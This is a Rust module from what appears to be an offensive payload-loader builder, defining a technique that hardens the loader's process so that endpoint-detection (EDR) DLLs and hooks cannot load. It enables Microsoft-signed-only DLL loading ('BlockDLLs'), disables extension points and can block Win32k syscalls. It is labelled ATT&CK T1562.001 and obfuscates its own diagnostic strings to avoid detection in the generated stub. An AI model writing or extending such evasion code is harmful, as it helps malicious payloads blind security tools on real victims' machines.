//! Process mitigation policies.
//!
//! Hardens the loader's own process with documented Windows mitigation policies:
//! block non-Microsoft DLLs (the "BlockDLLs" trick that keeps an unsigned
//! userland EDR DLL from mapping), disable extension points (`AppInit_DLLs` and
//! legacy global hooks) and, optionally, block Win32k system calls. A
//! Preparation technique: it modifies the process state and never runs the
//! payload. See `README.md` for the full write-up.

use serde::{Deserialize, Serialize};

use crate::engine::obfuscation::StringsConfig;

use super::{Capability, Category, Stability, TechniqueDef};

/// Parameters for the process-mitigation hardening.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Params {
    /// Block DLLs not signed by Microsoft (`ProcessSignaturePolicy`,
    /// `MicrosoftSignedOnly`). The "BlockDLLs" mitigation: an unsigned userland
    /// EDR DLL can no longer be mapped into the process.
    #[serde(default = "default_true")]
    pub block_dlls: bool,

    /// Disable extension points (`ProcessExtensionPointDisablePolicy`): no
    /// `AppInit_DLLs` and no legacy global hooks load.
    #[serde(default = "default_true")]
    pub extension_points: bool,

    /// Block Win32k system calls (`ProcessSystemCallDisablePolicy`). Blinds the
    /// Win32k-based userland hooks some EDRs use, but a payload that needs the
    /// GUI stops working, so it is off by default.
    #[serde(default = "default_false")]
    pub win32k_filter: bool,
}

/// Default for the load-bearing hardening flags: apply them.
pub fn default_true() -> bool {
    true
}

/// Default for the GUI-breaking flag: leave it off.
pub fn default_false() -> bool {
    false
}

impl Default for Params {
    /// Defaults to blocking non-Microsoft DLLs and disabling extension points
    /// (see [`default_true`] / [`default_false`]).
    fn default() -> Self {
        Self {
            block_dlls: default_true(),
            extension_points: default_true(),
            win32k_filter: default_false(),
        }
    }
}

/// Static metadata for the process-mitigation hardening.
pub const DEF: TechniqueDef = TechniqueDef {
    name: "process_mitigations",
    // T1562.001: impair the userland EDR instrumentation by refusing to map its
    // DLL, not by patching a function.
    attck: &["T1562.001"],
    // Measured on Windows 11 26200 (2026-10-14): `LoadLibraryW` of a locally
    // built, unsigned DLL is refused with `ERROR_ACCESS_DENIED` under the
    // default `block_dlls`, while Microsoft-signed modules still load.
    stability: Stability::Stable,
    requires: &[Capability::WindowsX64, Capability::WindowsX86],
    conflicts: &[],
    category: Category::Preparation,
    doc_path: "src/techniques/process_mitigations/README.md",
    readme: include_str!("README.md"),
    stub_fragment: include_str!("stub_fragment.rs"),
    formats: &[],
    requires_indirect_syscalls: false,
    params_example: "technique: process_mitigations\nparams:\n  block_dlls: true\n  extension_points: true\n  win32k_filter: false\n",
    // `SetProcessMitigationPolicy` is a documented process-configuration API
    // (`kernel32`), not an `Nt*` syscall stub, so the syscall layer has nothing
    // to route. It is in the same category as `CreateProcessA`.
    syscalls: &[],
    resolves_imports: false,
};

/// Runtime diagnostics the fragment can emit, as `(placeholder, plaintext)`
/// pairs.
///
/// `render_fragment` replaces each placeholder with code that rebuilds the
/// message at runtime, so no diagnostic text — and no technique keyword like
/// `loader` — lands in the generated stub's `.rdata`.
const MESSAGES: &[(&str, &str)] = &[(
    "$MSG_BLOCK_DLLS_FAILED$",
    "failed to block non-Microsoft DLLs",
)];

impl Params {
    /// Renders the process-mitigation stub fragment, baking in which policies are
    /// applied and obfuscating the diagnostic through `strings`.
    pub fn render_fragment(&self, strings: &StringsConfig) -> String {
        let mut rendered = DEF
            .stub_fragment
            .replace(
                "$BLOCK_DLLS$",
                if self.block_dlls { "true" } else { "false" },
            )
            .replace(
                "$EXTENSION_POINTS$",
                if self.extension_points {
                    "true"
                } else {
                    "false"
                },
            )
            .replace(
                "$WIN32K_FILTER$",
                if self.win32k_filter { "true" } else { "false" },
            );
        for (index, (placeholder, text)) in MESSAGES.iter().enumerate() {
            rendered = rendered.replace(
                placeholder,
                &strings
                    .obfuscate(text)
                    .render_stub_expr(&format!("mitigations_msg_{index}")),
            );
        }
        rendered
    }
}

#[cfg(test)]
mod tests;
